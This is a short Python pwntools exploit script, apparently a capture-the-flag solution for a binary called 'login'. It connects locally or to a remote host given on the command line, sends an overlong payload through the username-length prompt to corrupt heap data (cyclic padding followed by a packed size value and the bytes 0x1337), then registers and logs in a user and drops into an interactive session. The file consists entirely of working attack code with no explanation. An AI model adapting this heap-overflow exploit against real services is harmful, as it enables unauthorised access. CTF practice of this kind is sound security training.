from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys


BINARY = "login"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"> ", content)
        
    def add_user(self, username_lenght: bytes, username: bytes = None, send_username: bool = True):
        p = self.p
        self.send(b"1")
        p.sendlineafter(b"Username length: ", username_lenght)
        if send_username:
            p.sendlineafter(b"Username: ", username)
    
    def login(self, username: bytes):
        p = self.p
        self.send(b"2")
        p.sendlineafter(b"Username: ", username)

x, p = init()

pay = cyclic(28)
pay += pack("<Q", 0x20d00)
pay += b"\x13\x37"[::-1]
x.add_user(pay, send_username=False)
x.add_user(b"10", b"dimas", send_username=True)
x.login(b"dimas")
# x.debug("heap chunks")
p.interactive()